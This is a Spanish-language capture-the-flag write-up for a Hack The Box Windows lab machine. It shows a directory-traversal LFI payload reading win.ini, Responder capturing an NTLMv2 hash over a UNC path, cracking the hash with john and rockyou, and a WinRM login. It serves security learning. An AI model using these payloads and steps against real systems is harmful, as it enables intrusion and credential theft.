**IP:** 10.129.160.230
**OS:** Windows
**Dificultad:** Very Easy
**Técnica Clave:** LFI (Local File Inclusion) / NTLM Theft
**Fecha:** 2025-11-21

---
## 1. Reconocimiento 
Primer escaneo para identificar servicios en la máquina Windows.
```bash 
nmap -p- --min-rate 5000 -sVC 10.129.160.230
```
**Resultados del Escaneo:**
```text
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  pando-pub? (Windows Update Delivery Optimization)
```
**Puerto 5985 (WinRM):** Windows Remote Management.
  - **¿Qué es?**: Es la interfaz de administración remota de Windows (similar a SSH en Linux).
  - **Importancia:** Si conseguimos credenciales (Usuario y Contraseña), podemos usar la herramienta **`evil-winrm`** para conectarnos y obtener una consola de comandos (Shell) en el sistema.
## 2. Configuración de DNS (Virtual Hosting)
Al acceder a la IP por el navegador, el servidor nos redirige automáticamente al dominio `unika.htb`. Para poder visualizar la web correctamente, añadimos la entrada a nuestro archivo `/etc/hosts`.

**Comando:**
```bash
echo "10.129.160.230 unika.htb" | sudo tee -a /etc/hosts
```
## 3. Enumeración Web y Descubrimiento LFI
Navegamos por la web `http://unika.htb`. Observamos que la web carga el contenido dinámicamente mediante un parámetro en la URL al cambiar de idioma.

**Indicio de Vulnerabilidad:**
URL original: `http://unika.htb/index.php?page=french.html`

El parámetro `page=` sugiere que el servidor está "llamando" a un archivo local (`french.html`).

**Prueba de Concepto (PoC):**
Intentamos un ataque de **Directory Traversal** (retroceder directorios) para leer un archivo conocido de Windows (`win.ini`).

* **Payload:** `../../../../../../windows/win.ini`
* **URL Final:** `http://unika.htb/index.php?page=../../../../../../windows/win.ini`

**Resultado:**
La web nos muestra el contenido del archivo de configuración de Windows (`[fonts]`, `[extensions]`, etc.).
**Confirmamos vulnerabilidad LFI (Local File Inclusion).**

**Confirmación de la Vulnerabilidad:**
La web nos devuelve el contenido en texto plano del archivo `win.ini`:

```ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
## 4. Captura de Hash NTLMv2 (Responder)
Utilizamos el LFI para invocar una ruta UNC que apunte a nuestra máquina atacante (a través de la VPN `tun0`).

**1. Preparación:**
Iniciamos **Responder** escuchando en la interfaz de la VPN:
```bash
sudo responder -I tun0
```
## 5. Cracking de Contraseña (John The Ripper)
Procedemos a romper el hash NTLMv2 capturado utilizando un ataque de diccionario.

**Comando:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
## 6. Obtención de Flags (Looting)
Una vez dentro con una shell de PowerShell (Evil-WinRM), navegamos a los directorios de los usuarios para leer las banderas.

**Root Flag:**
Ubicación: `C:\Users\Administrator\Desktop\root.txt`
> [!success] Root Flag
> HTB{...}

**User Flag:**
Ubicación: `C:\Users\mike\Desktop\user.txt`
> [!success] User Flag
> HTB{...}

---

## 7. Resumen de Aprendizaje

> [!metadata] Misión Cumplida
> **Estado:** ✅ Pwned
> **Fecha:** 2025-11-21
> **Valoración:** ⭐⭐⭐⭐⭐ (Imprescindible para entender redes Windows)
> **Skills:** #LFI #NTLM #Responder #Cracking #WinRM

**🧠 Conceptos Clave Asimilados:**
1. **LFI a RCE/Robo:** He aprendido que un Local File Inclusion (LFI) no sirve solo para leer archivos, sino para **forzar conexiones** a mi máquina atacante usando rutas UNC (`\\IP\share`).
2. **Peligro de NTLM:** Windows autentica automáticamente las conexiones SMB enviando el hash del usuario. Herramientas como **Responder** son letales en redes internas.
3. **WinRM:** El puerto 5985 es la "puerta trasera" perfecta si tienes credenciales válidas.
4. **Cracking:** Un hash capturado puede romperse fácilmente (`john`) si la contraseña es débil (diccionario rockyou).